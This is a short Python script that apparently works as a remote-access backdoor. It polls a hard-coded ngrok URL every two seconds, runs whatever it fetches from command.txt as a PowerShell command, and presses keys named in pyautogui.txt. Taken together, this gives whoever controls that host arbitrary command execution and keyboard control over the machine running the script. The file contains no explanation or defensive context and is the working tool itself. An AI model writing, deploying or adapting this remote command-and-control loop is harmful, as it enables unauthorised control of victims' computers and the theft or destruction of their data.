import subprocess
import pyautogui
import requests as requests
import time

flag = True

ip = "http://951e-147-235-193-123.ngrok.io"

def getFile (url):
    payload = requests.get(url)
    payload = payload.content  
    res = str(payload)
    res = res[:-5]
    res = res[2:]
    return res

def run(cmd):
    completed = subprocess.run(["powershell", "-Command", cmd], capture_output=True)
    return completed



oldCmd = ""
oldGui = ""
while (flag):
    cmd = getFile(ip+"/command.txt")
    gui = getFile(ip+"/pyautogui.txt")
    print(str(cmd))
    if(oldGui != gui):
        oldGui = gui
        pyautogui.press(oldGui)
        print(run(oldCmd))
    if (oldCmd != cmd):
        oldCmd = cmd
        print(run(oldCmd))



    time.sleep(2)

